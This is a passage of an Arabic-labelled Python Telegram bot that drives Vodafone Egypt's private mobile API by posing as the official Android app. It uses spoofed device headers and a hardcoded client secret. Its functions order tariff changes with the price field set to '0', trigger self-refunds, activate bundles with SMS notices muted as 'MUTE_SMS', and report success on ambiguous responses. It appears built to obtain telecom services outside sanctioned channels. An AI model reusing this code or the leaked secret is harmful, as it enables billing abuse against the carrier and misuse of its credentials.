        'x-agent-version': '2025.11.1',
        'x-agent-build': '1063',
        'msisdn': phone,
        'Content-Type': 'application/json',
        'Accept-Language': 'ar',
    }
    
    params = {
        'customerAccountId': phone,
        'type': 'MIProducts',
    }
    
    try:
        response = requests.get(
            'https://mobile.vodafone.com.eg/services/dxl/epo/eligibleProductOffering',
            params=params,
            headers=headers,
            timeout=30
        )
        if response.status_code == 200:
            return response.json()
        return None
    except Exception:
        return None

def parse_apps_packages(data):
    if not data:
        return []
    
    apps_packages = []
    index = 1
    app_keywords = [
        'تيك توك', 'tiktok', 'يوتيوب', 'youtube', 
        'بلاي', 'play', 'انغامي', 'anghami', 
        'ووتش', 'watch', 'بين', 'bein', 'واتساب', 'whatsapp',
        'فيسبوك', 'facebook', 'انستغرام', 'instagram'
    ]
    
    def extract_app_name(name, desc):
        app_names = {
            'تيك توك': 'تيك توك', 'tiktok': 'تيك توك',
            'يوتيوب': 'يوتيوب', 'youtube': 'يوتيوب',
            'انغامي': 'انغامي', 'anghami': 'انغامي',
            'بلاي': 'جوجل بلاي', 'play': 'جوجل بلاي',
            'ووتش': 'ووتش إيت', 'watch': 'ووتش إيت',
            'بين': 'بين سبورت', 'bein': 'بين سبورت',
            'واتساب': 'واتساب', 'whatsapp': 'واتساب',
            'فيسبوك': 'فيسبوك', 'facebook': 'فيسبوك',
            'انستغرام': 'انستغرام', 'instagram': 'انستغرام'
        }
        text = (name + ' ' + desc).lower()
        for keyword, arabic_name in app_names.items():
            if keyword in text:
                return arabic_name
        return 'تطبيق'
    
    for item in data:
        if 'parts' in item and 'productOffering' in item['parts']:
            offerings = item['parts']['productOffering']
            if not isinstance(offerings, list):
                offerings = [offerings]
            
            for offering in offerings:
                name = offering.get('name', '')
                desc = offering.get('desc', '')
                
                name_lower = name.lower()
                desc_lower = desc.lower() if desc else ""
                
                is_app_package = False
                for keyword in app_keywords:
                    if keyword in name_lower or keyword in desc_lower:
                        is_app_package = True
                        break
                
                if is_app_package:
                    package = {
                        'index': index,
                        'name': name,
                        'desc': desc,
                        'id': '',
                        'encProductId': '',
                        'price': 0,
                        'quota': 'غير معروف',
                        'duration': 'غير معروف',
                        'app_name': extract_app_name(name, desc)
                    }
                    
                    id_list = offering.get('id', [])
                    if isinstance(id_list, list):
                        for id_item in id_list:
                            if id_item.get('schemeName') == 'CommercialID':
                                package['id'] = id_item.get('value', '')
                            elif id_item.get('schemeName') == 'EncProductID':
                                package['encProductId'] = id_item.get('value', '')
                    
                    price_list = offering.get('price', [])
                    if isinstance(price_list, list):
                        for price_item in price_list:
                            if 'originalPrice' in price_item and 'value' in price_item['originalPrice']:
                                package['price'] = price_item['originalPrice']['value']
                                break
                    
                    spec = offering.get('specification', {})
                    char_list = spec.get('characteristicsValue', [])
                    if isinstance(char_list, list):
                        for char in char_list:
                            if char.get('characteristicName') == 'QUOTA':
                                value = char.get('value', '')
                                unit = char.get('type', 'MB')
                                package['quota'] = f"{value} {unit}"
                            elif char.get('characteristicName') == 'DURATION':
                                package['duration'] = char.get('value', 'غير معروف')
                    
                    if package['price'] > 0:
                        apps_packages.append(package)
                        index += 1
    
    return apps_packages

def activate_apps_package(token, phone, package):
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Connection': 'Keep-Alive',
        'Accept': 'application/json',
        'Authorization': f'Bearer {token}',
        'api-version': 'v2',
        'device-id': '7be546fe335911d2',
        'x-agent-operatingsystem': '13',
        'clientId': 'AnaVodafoneAndroid',
        'x-agent-device': 'Samsung SM-A515F',
        'x-agent-version': '2025.11.1',
        'x-agent-build': '1063',
        'msisdn': phone,
        'Content-Type': 'application/json',
        'Accept-Language': 'ar',
    }
    
    json_data = {
        'channel': {'name': 'MobileApp'},
        'orderItem': [{
            'action': 'add',
            'product': {
                'characteristic': [
                    {'name': 'LangId', 'value': 'ar'},
                    {'name': 'ExecutionType', 'value': 'Sync'},
                    {'name': 'DropAddons', 'value': 'False'},
                    {'name': 'OneStepMigrationFlag', 'value': 'Y'},
                    {'name': 'Journey', 'value': 'MI_ELigibility'},
                ],
                'encProductId': package['encProductId'],
                'id': package['id'],
                'relatedParty': [{'id': phone, 'name': 'MSISDN', 'role': 'Subscriber'}],
                '@type': 'MI',
            },
            'eCode': 0,
        }],
        '@type': 'MIProfile',
    }
    
    try:
        response = requests.post(
            'https://mobile.vodafone.com.eg/services/dxl/pom/productOrder', 
            headers=headers, 
            json=json_data,
            timeout=30
        )
        if response.status_code in [200, 201, 202]:
            return {"success": True, "message": f"تم تفعيل {package['name']} بنجاح", "price": package['price'], "quota": package['quota'], "duration": package['duration'], "app_name": package['app_name']}
        return {"success": False, "message": f"فشل التفعيل: {response.status_code}"}
    except Exception as e:
        return {"success": False, "message": f"خطأ: {str(e)}"}

def show_apps_packages_markup(packages):
    markup = types.InlineKeyboardMarkup(row_width=1)
    for pkg in packages:
        markup.add(types.InlineKeyboardButton(
            text=f"{pkg['name']} - {pkg['price']} جنيه",
            callback_data=f"apps_package_{pkg['index']}"
        ))
    markup.add(types.InlineKeyboardButton(text=f"{EMOJI['back']} رجوع", callback_data="back_to_main"))
    markup.add(types.InlineKeyboardButton(text=f"{EMOJI['cancel']} إلغاء", callback_data="cancel_action"))
    return markup

# ==================== وظائف الماني باك (من ملف ماني_باك__2_.py - النسخة المحدثة) ====================
class VodafoneMoneyBack:
    def __init__(self):
        self.token = None
        self.phone = None
        self.password = None          # لتجديد التوكن تلقائياً
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'okhttp/4.12.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip',
        })
    
    def login(self, phone, password):
        """تسجيل الدخول مع إرجاع (bool, message)"""
        self.phone = phone
        self.password = password
        url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
        payload = {
            'grant_type': "password",
            'username': phone,
            'password': password,
            'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
            'client_id': "ana-vodafone-app"
        }
        headers = {
            'User-Agent': "okhttp/4.12.0",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip",
            'silentLogin': "true",
            'x-agent-operatingsystem': "15",
            'clientId': "AnaVodafoneAndroid",
            'Accept-Language': "ar",
            'x-agent-device': "Samsung SM-A165F",
            'x-agent-version': "2025.12.2",
            'x-agent-build': "1080",
            'digitalId': "25VT5Q5QWG8DK",
            'device-id': "b26ba335813fad21"
        }
        try:
            response = requests.post(url, data=payload, headers=headers, timeout=10)
            if response.status_code == 200:
                data = response.json()
                self.token = data.get('access_token')
                self.session.headers.update({
                    'Authorization': f'Bearer {self.token}',
                    'msisdn': self.phone
                })
                return True, "✅ تم تسجيل الدخول بنجاح"
            else:
                if response.status_code == 401:
                    return False, "⚠️ رقم الهاتف أو كلمة المرور غير صحيحة"
                return False, f"❌ فشل تسجيل الدخول (كود {response.status_code})"
        except Exception as e:
            return False, f"❌ خطأ في الاتصال: {e}"
    
    def refresh_login(self):
        """إعادة تسجيل الدخول تلقائياً باستخدام البيانات المخزنة"""
        if self.phone and self.password:
            return self.login(self.phone, self.password)
        return False, "لا توجد بيانات لتسجيل الدخول"
    
    def get_usage_data(self, days=30):
        """جلب بيانات الاستخدام (تعيد البيانات أو None)"""
        if not self.token:
            return None
        end_date = datetime.now()
        start_date = end_date - timedelta(days=days)
        end_timestamp = int(end_date.timestamp() * 1000)
        start_timestamp = int(start_date.timestamp() * 1000)
        url = "https://mobile.vodafone.com.eg/services/dxl/usagemng/usage"
        params = {
            'relatedParty.id': self.phone,
            'validFor.startDateTime': str(start_timestamp),
            '@type': 'BalanceDetails',
            'validFor.endDateTime': str(end_timestamp),
        }
        headers = {
            'User-Agent': 'okhttp/4.11.0',
            'Connection': 'Keep-Alive',
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip',
            'api-host': 'UsageManagementHost',
            'Authorization': f'Bearer {self.token}',
            'api-version': 'v2',
            'x-agent-operatingsystem': '15',
            'clientId': 'AnaVodafoneAndroid',
            'x-agent-device': 'Samsung SM-A165F',
            'x-agent-version': '2025.12.2',
            'x-agent-build': '1080',
            'msisdn': self.phone,
            'Content-Type': 'application/json',
            'Accept-Language': 'ar'
        }
        try:
            response = requests.get(url, params=params, headers=headers, timeout=15)
            if response.status_code == 200:
                return response.json()
            else:
                return None
        except Exception:
            return None
    
    def get_consumption_data(self):
        """جلب بيانات الاستهلاك (الرصيد)"""
        if not self.token:
            return None
        url = "https://mobile.vodafone.com.eg/services/dxl/usage/usageConsumptionReport"
        params = {'@type': "aggregated", 'bucket.product.publicIdentifier': self.phone}
        headers = {
            'User-Agent': "okhttp/4.12.0",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'api-host': "usageConsumptionHost",
            'useCase': "aggregated",
            'Authorization': f"Bearer {self.token}",
            'api-version': "v2",
            'device-id': "b26ba335813fad21",
            'x-agent-operatingsystem': "15",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "Samsung SM-A165F",
            'x-agent-version': "2025.12.2",
            'x-agent-build': "1080",
            'msisdn': self.phone,
            'Content-Type': "application/json",
            'Accept-Language': "ar"
        }
        try:
            response = requests.get(url, params=params, headers=headers, timeout=10)
            if response.status_code == 200:
                return response.json()
            else:
                return None
        except Exception:
            return None
    
    def extract_moneyback_balance(self, consumption_data):
        """استخراج رصيد الماني باك من بيانات الاستهلاك"""
        if not consumption_data:
            return None
        try:
            for item in consumption_data:
                if item.get("@type") == "OTHERS":
                    for bucket in item.get("bucket", []):
                        if bucket.get("usageType") == "money":
                            for balance in bucket.get("bucketBalance", []):
                                if balance.get("@type") == "Remaining":
                                    remaining = balance.get("remainingValue", {})
                                    # remainingValue بيكون dict فيها amount و units
                                    if isinstance(remaining, dict):
                                        amount = remaining.get("amount", 0)
                                        units = remaining.get("units", "جنيه")
                                    else:
                                        amount = remaining
                                        units = "جنيه"
                                    return {"amount": amount, "units": units}
        except Exception:
            pass
        return None
    
    def parse_moneyback_operations(self, usage_data):
        """تحليل عمليات الماني باك"""
        moneyback_ops = []
        if not usage_data:
            return moneyback_ops
        for item in usage_data:
            item_type = item.get('type', '')
            description = item.get('description', '')
            if item_type == 'Adjustment' and any(word in description.lower() for word in ['فليكس', 'فلکس', 'فلێكس', 'flex', 'باقة', 'باکە']):
                enc_product_id = None
                refundable = False
                for char in item.get('usageCharacteristic', []):
                    name = char.get('name', '')
                    value = char.get('value', '')
                    if name == 'EncProductID':
                        enc_product_id = value
                    elif name == 'RefundableFlag' and value == 'Y':
                        refundable = True
                if enc_product_id and refundable:
                    amount = 0
                    rated_usage = item.get('ratedProductUsage', [])
                    if rated_usage:
                        amount = abs(rated_usage[0].get('taxIncludedRatingAmount', 0))
                    date_str = item.get('date', '')
                    try:
                        if 'T' in date_str:
                            dt = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
                            readable_date = dt.strftime("%Y-%m-%d")
                        else:
                            readable_date = date_str[:10] if len(date_str) >= 10 else date_str
                    except:
                        readable_date = date_str[:10]
                    
                    bundle_type = 'باقة'
                    if 'فليكس' in description or 'flex' in description.lower():
                        bundle_type = 'باقة فليكس'
                    elif 'ميكس' in description or 'mix' in description.lower():
                        bundle_type = 'باقة ميكس'
                    
                    moneyback_ops.append({
                        'description': description,
                        'amount': amount,
                        'date': date_str,
                        'readable_date': readable_date,
                        'enc_product_id': enc_product_id,
                        'type': bundle_type,
                        'refundable': refundable
                    })
        return moneyback_ops
    
    def refund_bundle(self, enc_product_id, bundle_info):
        """استرداد باقة (ترجع (bool, message))"""
        if not self.token:
            return False, "لم يتم تسجيل الدخول"
        headers = {
            'User-Agent': 'okhttp/4.12.0',
            'Connection': 'Keep-Alive',
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip',
            'api-host': 'ProductOrderingManagement',
            'useCase': 'MONEYBACK',
            'Authorization': f'Bearer {self.token}',
            'api-version': 'v2',
            'x-agent-operatingsystem': '15',
            'clientId': 'AnaVodafoneAndroid',
            'x-agent-device': 'Samsung SM-A165F',
            'x-agent-version': '2025.12.2',
            'x-agent-build': '1080',
            'msisdn': self.phone,
            'Accept-Language': 'ar',
            'Content-Type': 'application/json; charset=UTF-8'
        }
        json_data = {
            'channel': {'name': 'internet'},
            'orderItem': [{
                'action': 'add',
                'product': {
                    'characteristic': [
                        {'name': 'WorkflowName', 'value': 'SelfRefund'},
                        {'name': 'EncProductID', 'value': enc_product_id},
                        {'name': 'ActionID', 'value': '10'},
                    ],
                    'relatedParty': [{'id': self.phone, 'name': 'MSISDN', 'role': 'Subscriber'}],
                },
                'eCode': 0,
            }],
            '@type': 'MoneyBack',
        }
        try:
            response = requests.post(
                'https://mobile.vodafone.com.eg/services/dxl/pom/productOrder',
                headers=headers, json=json_data, timeout=15
            )
            if response.status_code == 200:
                result = response.json()
                state = str(result.get('state', '')).lower()
                status = str(result.get('status', '')).lower()
                response_text = json.dumps(result).lower()
                success_indicators = ['completed', 'success', 'completedsuccessfully', 'تم', 'نجاح', 'اكتمل', 'مكتمل']
                if any(indicator in state or indicator in status or indicator in response_text for indicator in success_indicators):
                    return True, f"✅ تم استرداد {bundle_info['amount']} جنيه بنجاح"
                if any(word in response_text for word in ['already consumed', 'already refunded', 'مستهلكة', 'تم استهلاكها']):
                    return False, "❌ الباقة مستهلكة مسبقاً ولا يمكن استردادها"
                if any(word in response_text for word in ['not eligible', 'غير مؤهلة', 'غير متاحة']):
                    return False, "❌ الباقة غير مؤهلة للاسترداد"
                return True, f"✅ تم بدء عملية الاسترداد، سيصلك تأكيد من فودافون"
            else:
                error_msg = ""
                try:
                    error_response = response.json()
                    error_msg = error_response.get('message', response.text[:100])
                except:
                    error_msg = response.text[:100] if response.text else ""
                return False, f"❌ فشل الاسترداد (كود {response.status_code}) - {error_msg}"
        except Exception as e:
            return False, f"❌ خطأ تقني: {str(e)}"

# ==================== وظيفة تحويل 14 قرش (من الملف المدمج) ====================
def run_convert_14_piaster(phone: str, password: str) -> Tuple[bool, str]:
    """تحويل الرقم إلى باقة ريح بالك كله ب14 قرش"""
    try:
        # تسجيل الدخول
        auth_result = get_authorization(phone, password)
        if not auth_result['success']:
            return False, f"❌ فشل تسجيل الدخول: {auth_result['message']}"
        
        token = auth_result['bearer_token']
        
        # 1. جلب encProductId للباقة
        url_get = "https://mobile.vodafone.com.eg/services/dxl/epo/eligibleProductOffering"
        
        params = {
            'customerAccountId': phone,
            'parts.customerAccount.type': "Consumer",
            'Accept-Language': "ar",
            'type': "Tarrifs"
        }
        
        headers = {
            'User-Agent': "okhttp/4.12.0",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip",
            'x-agent-operatingsystem': "15",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "Samsung SM-A165F",
            'x-agent-version': "2025.12.2",
            'x-agent-build': "1080",
            'device-id': "b26ba335813fad21",
            'Accept-Language': "ar",
            'Connection': "Keep-Alive",
            'api-host': "EligibleProductOfferingHost",
            'useCase': "Tarrifs",
            'Authorization': token,
            'api-version': "v2",
            'msisdn': phone,
            'Content-Type': "application/json"
        }
        
        response = requests.get(url_get, params=params, headers=headers, timeout=30)
        
        if response.status_code != 200:
            return False, "❌ فشل في جلب معلومات الباقة"
        
        data = response.json()
        target_name = "ريح بالك كله ب14 قرش"
        enc_product_id = None
        tibco_id = None
        tariff_id = None
        rank = None
        
        for item in data:
            if 'parts' not in item or 'productOffering' not in item['parts']:
                continue
            for product in item['parts']['productOffering']:
                if product.get('name') == target_name:
                    for id_item in product.get('id', []):
                        if id_item.get('schemeName') == 'EncProductID':
                            enc_product_id = id_item.get('value')
                        elif id_item.get('schemeID') == 'ProductID':
                            tibco_id = id_item.get('value')
                        elif id_item.get('schemeID') == 'TariffID':
                            tariff_id = id_item.get('value')
                    for char in product.get('specification', {}).get('characteristicsValue', []):
                        if char.get('characteristicName') == 'Rank':
                            rank = int(char.get('value', 99))
                    break
            if enc_product_id:
                break
        
        if not enc_product_id:
            return False, "❌ باقة ريح بالك غير متاحة لهذا الرقم"
        
        # 2. شراء الباقة
        url_post = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
        
        payload = {
            "channel": {"name": "MobileApp"},
            "orderItem": [
                {
                    "action": "add",
                    "id": tibco_id,
                    "itemPrice": [
                        {
                            "name": "OriginalPrice",
                            "price": {
                                "taxIncludedAmount": {
                                    "unit": "LE",
                                    "value": "0"
                                }
                            }
                        }
                    ],
                    "product": {
                        "characteristic": [
                            {"name": "TariffRank", "value": str(rank) if rank else "1"},
                            {"name": "TariffID", "value": tariff_id if tariff_id else ""},
                            {"name": "Quota", "value": ""},
                            {"name": "Validity", "@type": "MONTH", "value": ""},
                            {"name": "InterventionFlag", "value": "0"},
                            {"name": "DestNoOfSeats", "value": ""}
                        ],
                        "encProductId": enc_product_id,
                        "productSpecification": [
                            {"id": "ConsumerType", "name": "Category"},
                            {"id": "0", "name": "RatePlanType"},
                            {"id": "Other", "name": "BundleType"}
                        ],
                        "relatedParty": [
                            {"id": phone, "name": "MSISDN", "@referredType": "prepaid", "role": "Subscriber"},
                            {"id": tariff_id if tariff_id else "470", "name": "TariffID", "@referredType": "prepaid", "role": "TariffID"}
                        ]
                    },
                    "eCode": 0
                }
            ],
            "@type": "Tariff"
        }
        
        headers_post = {
            'User-Agent': "okhttp/4.12.0",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip",
            'x-agent-operatingsystem': "15",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "Samsung SM-A165F",
            'x-agent-version': "2025.12.2",
            'x-agent-build': "1080",
            'device-id': "b26ba335813fad21",
            'Accept-Language': "ar",
            'Connection': "Keep-Alive",
            'api-host': "ProductOrderingManagement",
            'useCase': "Tariff",
            'Authorization': token,
            'api-version': "v2",
            'msisdn': phone,
            'Content-Type': "application/json; charset=UTF-8"
        }
        
        response_post = requests.post(url_post, data=json.dumps(payload, ensure_ascii=False), headers=headers_post, timeout=30)
        
        if response_post.status_code in [200, 201, 400]:
            return True, f"✅ تم تحويل الرقم إلى باقة 14 قرش بنجاح!\n\n📱 الرقم: `{phone}`\n📦 الباقة: {target_name}"
        else:
            return False, f"❌ فشل التحويل - حاول لاحقًا (كود الخطأ: {response_post.status_code})"
            
    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}"

# ==================== وظيفة تمديد يومين ====================
def activate_rollover(phone, token):
    """تفعيل خدمة ترحيل اليومين"""
    url = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
    
    SUCCESS_CODES = ["2255"]
    
    payload = {
        "channel": {"name": "MobileApp"},
        "orderItem": [{
            "action": "add",
            "product": {
                "characteristic": [
                    {"name": "LangId", "value": "en"},
                    {"name": "ExecutionType", "value": "Sync"}
                ],
                "id": "FLEX_ROLLOVER",
                "relatedParty": [{"id": phone, "name": "MSISDN", "role": "Subscriber"}]
            }
        }],
        "@type": "FreeAppOptin"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "ba4068643748bc78",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "HONOR ALI-NX1",
        'x-agent-version': "2025.11.1.1",
        'x-agent-build': "1064",
        'msisdn': phone,
        'Accept-Language': "ar",
        'Content-Type': "application/json; charset=UTF-8"
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=40)
        try:
            data = response.json()
        except:
            data = {"code": str(response.status_code), "reason": response.text[:200]}
        
        if data and isinstance(data, dict):
            if data.get("code") in SUCCESS_CODES:
                return True, data, response.status_code
            if response.status_code in (200, 201, 202):
                return True, data, response.status_code
        return False, data, response.status_code
    except Exception as e:
        return False, {"reason": str(e)}, 500

def run_rollover_activation(phone, password):
    """تشغيل خدمة تمديد يومين"""
    try:
        auth_result = get_authorization(phone, password)
        if not auth_result['success']:
            return False, f"❌ فشل تسجيل الدخول: {auth_result['message']}"
        
        token = auth_result['token']
        success, result, status_code = activate_rollover(phone, token)
        
        if success:
            message = f"✅ تم تفعيل خدمة ترحيل اليومين بنجاح!\n\n📱 الرقم: `{phone}`"
            if isinstance(result, dict) and result.get("code") == "2255":
                message += f"\n\n⚠️ ملاحظة: أنت في فترة السماح (Grace period)\nولكن التفعيل تم بنجاح"
            return True, message
        else:
            error_msg = f"❌ فشل تفعيل خدمة ترحيل اليومين!\n\n📱 الرقم: `{phone}`\n🔴 كود الحالة: {status_code}"
            if isinstance(result, dict):
                error_code = result.get("code", "غير معروف")
                error_reason = result.get("reason", "لا يوجد تفاصيل")
                error_msg += f"\n🔴 كود الخطأ: {error_code}\n🔴 السبب: {error_reason}"
            return False, error_msg
            
    except Exception as e:
        return False, f"❌ حدث خطأ: {str(e)}"

# ==================== وظائف نوته فليكس 15 ====================
def note15_login(number, password):
    """تسجيل الدخول لخدمة نوته فليكس 15"""
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    
    data = {
        "grant_type": "password",
        "username": number,
        "password": password,
        "client_secret": "95fd95fb-7489-4958-8ae6-d31a525cd20a",
        "client_id": "ana-vodafone-app"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Accept': "application/json, text/plain, */*",
    }
    
    try:
        response = requests.post(url, data=data, headers=headers, timeout=30)
        if response.status_code == 200:
            token_data = response.json()
            return {"success": True, "token": token_data.get("access_token")}
        return {"success": False, "message": "الرقم أو كلمة المرور غير صحيحة"}
    except Exception as e:
        return {"success": False, "message": str(e)}

def process_note_flex_15(msisdn, token):
    """تفعيل نوته 15 + تجديد الباقة"""
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Connection': 'Keep-Alive',
        'Accept': 'application/json',
        'api-host': 'ProductOrderingManagement',
        'useCase': 'FlexACPRenewal',
        'Authorization': f'Bearer {token}',
        'api-version': 'v2',
        'device-id': '7be546fe335911d2',
        'x-agent-operatingsystem': '13',
        'clientId': 'AnaVodafoneAndroid',
        'x-agent-device': 'Samsung SM-A515F',
        'x-agent-version': '2025.11.1',
        'x-agent-build': '1063',
        'msisdn': f'{msisdn}',
        'Accept-Language': 'ar',
        'Content-Type': 'application/json; charset=UTF-8',
    }

    json_data = {
        'channel': {'name': 'MobileApp'},
        'orderItem': [
            {
                'action': 'insert',
                'id': 'Flex_17.5_2019',
                'product': {
                    'characteristic': [
                        {'name': 'PaymentMethod', 'value': 'ACP'},
                        {'name': 'ACP', 'value': 'True'},
                        {'name': 'SMSID', 'value': 'MUTE_SMS'},
                    ],
                    'encProductId': 'SBWbw/gsvm1cU1nPBj7HCg6MNEaAfyY56Kxz53nXBwpe6Z4c2t1DgiO2OM2hZwGVJaztwhZu7DWZiE2Ic5evFLqZfV/QaAOWQcS3m8bZCVD/wmRvbEvtfv16FTwgzWMjUQErPqXuYIMnePuK3H+MwQ8iFKqpvQ1d7qrPz05JlpUXKn2GM14uKA==',
                    'id': 'Flex_17.5_2019',
                    'relatedParty': [{'id': f'{msisdn}', 'name': 'MSISDN', 'role': 'Subscriber'}],
                },
                'eCode': 0,
            },
        ],
        '@type': 'FlexACPRenewal',
    }

    try:
        response = requests.post('https://mobile.vodafone.com.eg/services/dxl/pom/productOrder', 
                                  headers=headers, json=json_data, timeout=30)
        return response.status_code == 200
    except:
        return False

def get_flex_products_note(msisdn, token):
    """جلب منتجات Flex"""
    url = "https://mobile.vodafone.com.eg/services/dxl/pim/product"
    params = {'relatedParty.id': msisdn, '@type': "FlexProfile"}
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'api-host': "ProductInventoryManagementHost",
        'useCase': "FlexProfile",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "b26ba335813fad21",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "Samsung SM-A165F",
        'x-agent-version': "2026.1.1",
        'x-agent-build': "1090",
        'msisdn': msisdn,
        'Content-Type': "application/json",
        'Accept-Language': "ar"
    }
    
    try:
        response = requests.get(url, params=params, headers=headers, timeout=30)
        return response.json() if response.status_code == 200 else None
    except:
        return None

def find_main_bundle_note(products):
    """البحث عن الباقة الرئيسية"""
    if not products:
        return None
    
    main_bundles = []
    for product in products:
        if product.get('productPrice'):
            product_id = product.get('id')
            product_name = product.get('productSpecification', {}).get('name', '')
            enc_id = product.get('productOffering', {}).get('encProductId')
            
            prices = []
            for price in product.get('productPrice', []):
                if price.get('price', {}).get('taxIncludedAmount', {}).get('value'):
                    prices.append({'value': price['price']['taxIncludedAmount']['value']})
            
            if prices:
                main_bundles.append({
                    'id': product_id,
                    'name': product_name,
                    'encProductId': enc_id,
                    'prices': prices,
                })
    
    if not main_bundles:
        return None
    
    sorted_bundles = sorted(main_bundles, 
                           key=lambda x: float(x['prices'][0]['value']), 
                           reverse=True)
    return sorted_bundles[0]

def renew_flex_bundle_note(msisdn, token, bundle):
    """تجديد باقة Flex"""
    url = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
    
    payload = {
        "channel": {"name": "MobileApp"},
        "orderItem": [
            {
                "action": "repurchase",
                "product": {
                    "relatedParty": [{"id": msisdn, "name": "MSISDN", "role": "Subscriber"}],
                    "id": bundle['id'],
                    "encProductId": bundle['encProductId']
                }
            }
        ],
        "@type": "FlexRenew"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'api-host': "ProductOrderingManagementHost",
        'useCase': "FlexRenew",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "b26ba335813fad21",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "Samsung SM-A165F",
        'x-agent-version': "2026.1.1",
        'x-agent-build': "1090",
        'msisdn': msisdn,
        'Content-Type': "application/json",
        'Accept-Language': "ar"
    }
    
    try:
        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=30)
        return response.status_code == 200
    except:
        return False

def note15_only(msisdn, token):
    """تفعيل نوته 15 فقط"""
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Connection': 'Keep-Alive',
        'Accept': 'application/json',
        'api-host': 'ProductOrderingManagement',
        'useCase': 'FlexACPRenewal',
        'Authorization': f'Bearer {token}',
        'api-version': 'v2',
        'device-id': '7be546fe335911d2',
        'x-agent-operatingsystem': '13',
        'clientId': 'AnaVodafoneAndroid',
        'x-agent-device': 'Samsung SM-A515F',
        'x-agent-version': '2025.11.1',
        'x-agent-build': '1063',
        'msisdn': f'{msisdn}',
        'Accept-Language': 'ar',
        'Content-Type': 'application/json; charset=UTF-8',
    }

    json_data = {
        'channel': {'name': 'MobileApp'},
        'orderItem': [
            {
                'action': 'insert',
                'id': 'Flex_17.5_2019',
                'product': {
                    'characteristic': [
                        {'name': 'PaymentMethod', 'value': 'ACP'},
                        {'name': 'ACP', 'value': 'True'},
                        {'name': 'SMSID', 'value': 'MUTE_SMS'},
                    ],
                    'encProductId': 'SBWbw/gsvm1cU1nPBj7HCg6MNEaAfyY56Kxz53nXBwpe6Z4c2t1DgiO2OM2hZwGVJaztwhZu7DWZiE2Ic5evFLqZfV/QaAOWQcS3m8bZCVD/wmRvbEvtfv16FTwgzWMjUQErPqXuYIMnePuK3H+MwQ8iFKqpvQ1d7qrPz05JlpUXKn2GM14uKA==',
                    'id': 'Flex_17.5_2019',
                    'relatedParty': [{'id': f'{msisdn}', 'name': 'MSISDN', 'role': 'Subscriber'}],
                },
                'eCode': 0,
            },
        ],
        '@type': 'FlexACPRenewal',
    }

    try:
        response = requests.post('https://mobile.vodafone.com.eg/services/dxl/pom/productOrder', headers=headers, json=json_data, timeout=30)
        return response.status_code == 200
    except:
        return False

def check_note15_eligibility(msisdn, token):
    """فحص التاهيل لنوته 15"""
    service_url = "https://mobile.vodafone.com.eg/services/dxl/poq/productOfferingQualificationManagement/v1/productOfferingQualification/FlexACP"
    params = {
        '$.relatedParty.id': msisdn,
        '$.productOfferingQualificationItem.product.id': "Flex_2021_517",
        '@type': "FlexACP"
    }
    service_headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "0df2e7f69ea37dd8",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "INFINIX Infinix X6725",
        'x-agent-version': "2025.11.1",
        'x-agent-build': "1063",
        'msisdn': msisdn,
        'Content-Type': "application/json",
        'Accept-Language': "ar"
    }

    try:
        response = requests.get(service_url, params=params, headers=service_headers, timeout=30)
        if response.status_code != 200:
            try:
                error_data = response.json()
                if 'code' in error_data and 'reason' in error_data:
                    return False, f"الرقم غير مؤهل للنوته\nالسبب: {error_data['reason']}\nكود الخطأ: {error_data['code']}"
                else:
                    return False, "فشل الاستعلام عن الخدمة"
            except:
                return False, "فشل الاستعلام عن الخدمة"
        else:
            data = response.json()
            if 'productOfferingQualificationItem' in data:
                return True, f"الرقم مؤهل للنوته\n📞 الرقم: {msisdn}"
            else:
                return True, f"الرقم مؤهل للنوته"
    except:
        return False, "حدث خطأ أثناء الفحص"

def run_note15_option1(phone, password):
    """تشغيل الخيار الأول: تفعيل نوته 15 + تجديد الباقة"""
    try:
        auth_result = note15_login(phone, password)
        if not auth_result['success']:
            return False, f"❌ فشل تسجيل الدخول: {auth_result['message']}"
        
        token = auth_result['token']
        
        # تفعيل نوته 15
        success1 = process_note_flex_15(phone, token)
        time.sleep(2)
        
